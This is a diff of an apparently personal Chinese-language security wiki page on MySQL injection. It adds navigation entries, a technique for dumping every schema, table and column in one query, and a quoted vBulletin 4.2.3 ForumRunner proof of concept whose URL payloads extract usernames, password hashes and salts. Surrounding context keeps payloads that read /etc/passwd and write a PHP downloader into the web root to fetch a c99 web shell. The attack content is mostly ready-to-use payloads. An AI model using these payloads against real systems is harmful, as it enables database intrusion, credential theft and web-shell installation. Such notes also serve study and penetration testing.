@@ -1343,7 +1343,20 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.8.1" data-path="../PHP/function.html">
+        <li class="chapter " data-level="1.8.1" data-path="../PHP/phpstorm.html">
+            
+                <a href="../PHP/phpstorm.html">
+            
+                    
+                    PHPSTORM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../PHP/function.html">
             
                 <a href="../PHP/function.html">
             
@@ -1356,7 +1369,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.8.2" data-path="../PHP/configure.html">
+        <li class="chapter " data-level="1.8.3" data-path="../PHP/configure.html">
             
                 <a href="../PHP/configure.html">
             
@@ -1369,7 +1382,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.8.3" data-path="../PHP/note.html">
+        <li class="chapter " data-level="1.8.4" data-path="../PHP/note.html">
             
                 <a href="../PHP/note.html">
             
@@ -1382,7 +1395,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.8.4" data-path="../PHP/正则匹配.html">
+        <li class="chapter " data-level="1.8.5" data-path="../PHP/正则匹配.html">
             
                 <a href="../PHP/正则匹配.html">
             
@@ -2063,7 +2076,7 @@ Time Delay           SELECT BENCHMARK(1000000,MD5(&#x2018;A&#x2019;));
 Make DNS Requests     Impossible?
 Command Execution    If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
 </code></pre>
-<h2 id="0x01_&#x4FE1;&#x606F;&#x6536;&#x96C6;">1. 0x01 &#x4FE1;&#x606F;&#x6536;&#x96C6;</h2><pre><code>system_user()     &#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x540D;
+<h2 id="&#x4FE1;&#x606F;&#x6536;&#x96C6;">1. &#x4FE1;&#x606F;&#x6536;&#x96C6;</h2><pre><code>system_user()     &#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x540D;
 user()            MYSQL&#x7528;&#x6237;&#x540D; 
 current_user()    &#x5F53;&#x524D;&#x7528;&#x6237;&#x540D;
 session_user()    &#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;
@@ -2074,12 +2087,14 @@ version()         &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x4FE
 load_file()       MYSQL&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x6587;&#x4EF6;
 
 @@datadir         Location of DB files
-@@hostname        &#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x540D;</code></pre>
+@@hostname        &#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x540D;
+@@basedir         MYSQL &#x5B89;&#x88C5;&#x8DEF;&#x5F84;
+@@version_compile_os    &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</code></pre>
 <pre><code>List Users              SELECT user FROM mysql.user; &#x2014; priv
 List Password Hashes    SELECT host, user, password FROM mysql.user; &#x2014; priv
 
 SELECT distinct(db) FROM mysql.db &#x2014; priv</code></pre>
-<h2 id="0x02_information_schema">2. 0x02 information_schema</h2><blockquote><p>MySQL &gt;= v5.0</p></blockquote><pre><code># &#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x5E93;
+<h2 id="information_schema">2. information_schema</h2><blockquote><p>MySQL &gt;= v5.0</p></blockquote><pre><code># &#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x5E93;
 SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
 
 # &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E;&#x8868;
@@ -2098,17 +2113,77 @@ SELECT table_schema, table_name FROM information_schema.columns WHERE column_nam
 
 # List Privilege
 SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;</code></pre>
-<h2 id="0x03_&#x6CE8;&#x91CA;">3. 0x03 &#x6CE8;&#x91CA;</h2><pre><code> -- comment     # &apos;--&apos; &#x524D;&#x540E;&#x6709;&#x7A7A;&#x683C;
+<h3 id="&#x4E0D;&#x4E00;&#x6837;&#x7684;&#x67E5;&#x8BE2;">2.1. &#x4E0D;&#x4E00;&#x6837;&#x7684;&#x67E5;&#x8BE2;</h3><pre><code>SELECT @ FROM (SELECT @:=0,(SELECT @ FROM YOUR_TABLE_NAME WHERE @ IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,YOUR_COLUMN_NAME, YOUR_COLUMN_NAME)))))x; 
 
-#comment
+SELECT @ FROM (SELECT @:=0,(SELECT 0 FROM YOUR_TABLE_NAME WHERE 0x00 IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,YOUR_COLUMN_NAME, YOUR_COLUMN_NAME)))))x; </code></pre>
+<p>&#x8BED;&#x53E5;&#x4E2D;<code>@</code>&#x53EF;&#x4EE5;&#x4E3A;<code>@x</code>&#x7B49;<code>@</code>+<code>&#x5176;&#x4ED6;&#x5B57;&#x6BCD;</code>&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x4EC5;&#x662F;&#x5B9A;&#x4E49;&#x53D8;&#x91CF;&#xFF0C;<code>@</code>&#x662F;&#x5FC5;&#x987B;&#x7684;&#x3002;</p><ul><li>&#x5217;&#x51FA;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x8868;
+</li></ul>
+<pre><code>SELECT @ FROM (SELECT @:=0,(SELECT @ FROM information_schema.columns WHERE @ IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,table_schema, table_name)))))x; </code></pre>
+<p>&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x5982;&#x4E0B;</p><pre><code>...
+information_schema:INNODB_BUFFER_PAGE
+information_schema:INNODB_CMP_PER_INDEX_RESET
+information_schema:XTRADB_READ_VIEW
+information_schema:INNODB_SYS_SEMAPHORE_WAITS
+information_schema:INNODB_CHANGED_PAGES
+information_schema:INNODB_FT_DELETED
+information_schema:INNODB_TABLESPACES_SCRUBBING
+mysql:column_stats
+mysql:columns_priv
+mysql:db
+mysql:event
+mysql:func
+mysql:general_log
+mysql:gtid_slave_pos
+mysql:help_category
+mysql:help_keyword
+mysql:help_relation
+mysql:help_topic
+mysql:host
+mysql:index_stats
+...</code></pre>
+<ul><li>&#x5217;&#x51FA;&#x7ED9;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x8868;&#x7684;&#x6240;&#x6709;&#x5B57;&#x6BB5;
+</li></ul>
+<pre><code>SELECT @ FROM (SELECT @:=0,(SELECT @ FROM information_schema.columns WHERE @ IN (@:=CONCAT(@, 0x0a,concat_ws(0x3a,table_schema, table_name, column_name)))))x; </code></pre>
+<p>&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p><pre><code>information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_STARTED
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_ACTIVE_THREADS
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_PAGE_NUMBER
+information_schema:INNODB_TABLESPACES_SCRUBBING:CURRENT_SCRUB_MAX_PAGE_NUMBER
+mysql:column_stats:db_name
+mysql:column_stats:table_name
+mysql:column_stats:column_name
+mysql:column_stats:min_value
+mysql:column_stats:max_value
+mysql:column_stats:nulls_ratio</code></pre>
+<ul><li>&#x5B9E;&#x4F8B; 
+</li></ul>
+<p><a href="https://www.exploit-db.com/exploits/40751/" target="_blank">vBulletin 4.2.3 - &apos;ForumRunner&apos; SQL Injection</a></p><pre><code>////////////////
+///  POC   ////
+///////////////
 
-/*comment*/</code></pre>
-<h2 id="0x04_&#x6587;&#x4EF6;&#x6743;&#x9650;">4. 0x04 &#x6587;&#x4EF6;&#x6743;&#x9650;</h2><p>&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x8BFB;&#x5199;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#xFF1A;</p><pre><code># &#x9700;&#x8981;root&#x7528;&#x6237;&#x6765;&#x6267;&#x884C;     MySQL 4/5
+SQL Injection payload to enumerate table names
+----------------------------------------------
+http://forum_directory/forumrunner/request.php?d=1&amp;cmd=get_spam_data&amp;postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -
+
+
+SQL Injection payload to enumerate column names from table &quot;user&quot;
+----------------------------------------------------------------
+http://forum_directory/forumrunner/request.php?d=1&amp;cmd=get_spam_data&amp;postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.columns)where (table_name=0x75736572) and (0x00) in (@x:=concat(@x,0x3c62723e,column_name))))x),5,6,7,8,9,10-- -
+
+
+SQL Injection payload to enumerate username,password hash and salt from &quot;user&quot; table
+----------------------------------------------------------------------------------
+http://forum_directory//forumrunner/request.php?d=1&amp;cmd=get_spam_data&amp;postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -</code></pre>
+<h2 id="&#x6CE8;&#x91CA;">3. &#x6CE8;&#x91CA;</h2><pre><code> 1.-- comment     # &apos;--&apos; &#x540E;&#x6709; &#x7A7A;&#x683C;, &#x5E38;&#x7528; &quot;-- -&quot;, &quot;--+&quot;
+
+2.#comment
+
+3./*comment</code></pre>
+<h2 id="&#x6587;&#x4EF6;&#x6743;&#x9650;">4. &#x6587;&#x4EF6;&#x6743;&#x9650;</h2><p>&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x8BFB;&#x5199;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#xFF1A;</p><pre><code># &#x9700;&#x8981;root&#x7528;&#x6237;&#x6765;&#x6267;&#x884C;     MySQL 4/5
 SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;
 
 # &#x666E;&#x901A;&#x7528;&#x6237;&#x90FD;&#x53EF;&#x4EE5;     MySQL 5
 SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &apos;file&apos; AND grantee like &apos;%username%&apos;;     </code></pre>
-<h2 id="0x05_load_file()">5. 0x05 load_file()</h2><p>&#x7528;&#x6237;&#x6709;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x5219;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p><pre><code>&#x2026;&apos; UNION ALL SELECT LOAD_FILE(&apos;/etc/passwd&apos;)    &#x2014; priv, can only read world-readable files.
+<h2 id="load_file()">5. load_file()</h2><p>&#x7528;&#x6237;&#x6709;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x5219;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p><pre><code>&#x2026;&apos; UNION ALL SELECT LOAD_FILE(&apos;/etc/passwd&apos;)    &#x2014; priv, can only read world-readable files.
 
 
 SELECT LOAD_FILE(0x2F6574632F706173737764);</code></pre>
@@ -2118,7 +2193,7 @@ MySQL&#x7528;&#x6237;&#x5FC5;&#x987B;&#x62E5;&#x6709;&#x5BF9;&#x6B64;&#x6587;&#x
 &#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x5FC5;&#x987B;&#x5C0F;&#x4E8E; max_allowed_packet&#x3002;
 @@max_allowed_packet&#x7684;&#x9ED8;&#x8BA4;&#x5927;&#x5C0F;&#x662F;1047552 &#x5B57;&#x8282;
 &#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x6216;&#x4E0D;&#x53EF;&#x8BFB;&#xFF0C;&#x8FD4;&#x56DE;NULL</code></pre>
-<h2 id="0x06_&#x5199;&#x6587;&#x4EF6;">6. 0x06 &#x5199;&#x6587;&#x4EF6;</h2><p>&#x5982;&#x679C;&#x7528;&#x6237;&#x6709;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x53EF;&#x4EE5;&#x5199;&#x6587;&#x4EF6;</p><pre><code>INTO OUTFILE/DUMPFILE
+<h2 id="&#x5199;&#x6587;&#x4EF6;">6. &#x5199;&#x6587;&#x4EF6;</h2><p>&#x5982;&#x679C;&#x7528;&#x6237;&#x6709;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x53EF;&#x4EE5;&#x5199;&#x6587;&#x4EF6;</p><pre><code>INTO OUTFILE/DUMPFILE
 
 SELECT * FROM mytable INTO dumpfile &apos;/tmp/somefile&apos;; &#x2014; priv, write to file system</code></pre>
 <pre><code>SELECT &apos;<span class="token prolog">&lt;? fwrite(fopen($_GET[f], \&apos;w\&apos;), file_get_contents($_GET[u])); ?&gt;</span>&apos; INTO OUTFILE &apos;/var/www/get.php&apos;
@@ -2127,7 +2202,7 @@ http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt</code></pre>
 <p>&#x6CE8;&#xFF1A;</p><pre><code>INTO OUTFILE &#x4E0D;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5DF2;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x3002;
 INTO OUTFILE &#x5FC5;&#x987B;&#x662F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x3002;
 &#x5F15;&#x53F7;&#x662F;&#x5FC5;&#x987B;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x7F16;&#x7801;&#x8DEF;&#x5F84;&#x540D;</code></pre>
-<h2 id="0x_&#x5B9E;&#x6218;">7. 0x &#x5B9E;&#x6218;</h2><h3 id="group_by_with_rollup">7.1. group by with rollup</h3><blockquote><p>alictf 2015 FuckMySQL</p></blockquote><p><a href="http://dev.mysql.com/doc/refman/5.5/en/group-by-modifiers.html" target="_blank">group by document</a></p><p>key code:</p><pre><code class="lang-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h2 id="&#x5B9E;&#x6218;">7. &#x5B9E;&#x6218;</h2><h3 id="group_by_with_rollup">7.1. group by with rollup</h3><blockquote><p>alictf 2015 FuckMySQL</p></blockquote><p><a href="http://dev.mysql.com/doc/refman/5.5/en/group-by-modifiers.html" target="_blank">group by document</a></p><p>key code:</p><pre><code class="lang-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">num_rows</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">&apos;key2&apos;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">&apos;key2&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -2137,7 +2212,7 @@ INTO OUTFILE &#x5FC5;&#x987B;&#x662F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x67E5;&#x
 <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token string">&quot;I am fucking!&quot;</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span></code></pre>
-<h2 id="&#x53C2;&#x8003;&#xFF1A;">8. &#x53C2;&#x8003;&#xFF1A;</h2><p><a href="http://drops.wooyun.org/tips/123" target="_blank">&#x4E4C;&#x4E91; mySql &#x6CE8;&#x5165;&#x79D1;&#x666E;</a></p><p><a href="http://drops.wooyun.org/tips/7299" target="_blank">&#x4E4C;&#x4E91; mysql &#x6CE8;&#x5165;&#x6280;&#x5DE7;</a></p><p><a href="http://www.openwall.com/john/" target="_blank">crack mysql password</a></p><div id="anchors-navbar"><i class="fa fa-anchor"></i><ul><p><a href="#"></a></p><li><a href="#0x01_&#x4FE1;&#x606F;&#x6536;&#x96C6;">1. 0x01 &#x4FE1;&#x606F;&#x6536;&#x96C6;</a></li><li><a href="#0x02_information_schema">2. 0x02 information_schema</a></li><li><a href="#0x03_&#x6CE8;&#x91CA;">3. 0x03 &#x6CE8;&#x91CA;</a></li><li><a href="#0x04_&#x6587;&#x4EF6;&#x6743;&#x9650;">4. 0x04 &#x6587;&#x4EF6;&#x6743;&#x9650;</a></li><li><a href="#0x05_load_file()">5. 0x05 load_file()</a></li><li><a href="#0x06_&#x5199;&#x6587;&#x4EF6;">6. 0x06 &#x5199;&#x6587;&#x4EF6;</a></li><li><a href="#0x_&#x5B9E;&#x6218;">7. 0x &#x5B9E;&#x6218;</a></li><ul><li><a href="#group_by_with_rollup">7.1. group by with rollup</a></li></ul><li><a href="#&#x53C2;&#x8003;&#xFF1A;">8. &#x53C2;&#x8003;&#xFF1A;</a></li></ul></div><a href="#0x01_&#x4FE1;&#x606F;&#x6536;&#x96C6;" id="goTop"><i class="fa fa-arrow-up"></i></a>
+<h2 id="&#x53C2;&#x8003;&#xFF1A;">8. &#x53C2;&#x8003;&#xFF1A;</h2><p><a href="http://drops.wooyun.org/tips/123" target="_blank">&#x4E4C;&#x4E91; mySql &#x6CE8;&#x5165;&#x79D1;&#x666E;</a></p><p><a href="http://drops.wooyun.org/tips/7299" target="_blank">&#x4E4C;&#x4E91; mysql &#x6CE8;&#x5165;&#x6280;&#x5DE7;</a></p><p><a href="http://www.openwall.com/john/" target="_blank">crack mysql password</a></p><div id="anchors-navbar"><i class="fa fa-anchor"></i><ul><p><a href="#"></a></p><li><a href="#&#x4FE1;&#x606F;&#x6536;&#x96C6;">1. &#x4FE1;&#x606F;&#x6536;&#x96C6;</a></li><li><a href="#information_schema">2. information_schema</a></li><ul><li><a href="#&#x4E0D;&#x4E00;&#x6837;&#x7684;&#x67E5;&#x8BE2;">2.1. &#x4E0D;&#x4E00;&#x6837;&#x7684;&#x67E5;&#x8BE2;</a></li></ul><li><a href="#&#x6CE8;&#x91CA;">3. &#x6CE8;&#x91CA;</a></li><li><a href="#&#x6587;&#x4EF6;&#x6743;&#x9650;">4. &#x6587;&#x4EF6;&#x6743;&#x9650;</a></li><li><a href="#load_file()">5. load_file()</a></li><li><a href="#&#x5199;&#x6587;&#x4EF6;">6. &#x5199;&#x6587;&#x4EF6;</a></li><li><a href="#&#x5B9E;&#x6218;">7. &#x5B9E;&#x6218;</a></li><ul><li><a href="#group_by_with_rollup">7.1. group by with rollup</a></li></ul><li><a href="#&#x53C2;&#x8003;&#xFF1A;">8. &#x53C2;&#x8003;&#xFF1A;</a></li></ul></div><a href="#&#x4FE1;&#x606F;&#x6536;&#x96C6;" id="goTop"><i class="fa fa-arrow-up"></i></a>
                                 
                                 </section>
                             
@@ -2180,7 +2255,7 @@ INTO OUTFILE &#x5FC5;&#x987B;&#x662F;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x67E5;&#x
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Mysql 注入","date":"2016-04-21 11:50","level":"1.5.5","depth":2,"next":{"title":"Mysql宽字节注入","level":"1.5.6","depth":2,"path":"WebSecurity/mysql宽字节注入.md","ref":"WebSecurity/mysql宽字节注入.md","articles":[]},"previous":{"title":"Mysql","level":"1.5.4","depth":2,"path":"WebSecurity/mysql.md","ref":"WebSecurity/mysql.md","articles":[]},"dir":"ltr"},"config":{"plugins":["prism","-highlight","splitter","sitemap","simple-page-toc","navigator"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"sitemap":{"hostname":"https://hxer.github.io"},"navigator":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"janes","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wiki | janes","language":"cn","gitbook":">= 3.2.0","description":"janes' note"},"file":{"path":"WebSecurity/mysqlinject.md","mtime":"2016-08-18T02:53:19.111Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-11-04T16:07:06.944Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Mysql 注入","date":"2016-04-21 11:50","level":"1.5.5","depth":2,"next":{"title":"Mysql宽字节注入","level":"1.5.6","depth":2,"path":"WebSecurity/mysql宽字节注入.md","ref":"WebSecurity/mysql宽字节注入.md","articles":[]},"previous":{"title":"Mysql","level":"1.5.4","depth":2,"path":"WebSecurity/mysql.md","ref":"WebSecurity/mysql.md","articles":[]},"dir":"ltr"},"config":{"plugins":["prism","-highlight","splitter","sitemap","simple-page-toc","navigator"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"sitemap":{"hostname":"https://hxer.github.io"},"navigator":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"janes","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wiki | janes","language":"cn","gitbook":">= 3.2.0","description":"janes' note"},"file":{"path":"WebSecurity/mysqlinject.md","mtime":"2016-11-15T02:57:50.000Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-11-15T05:28:12.582Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
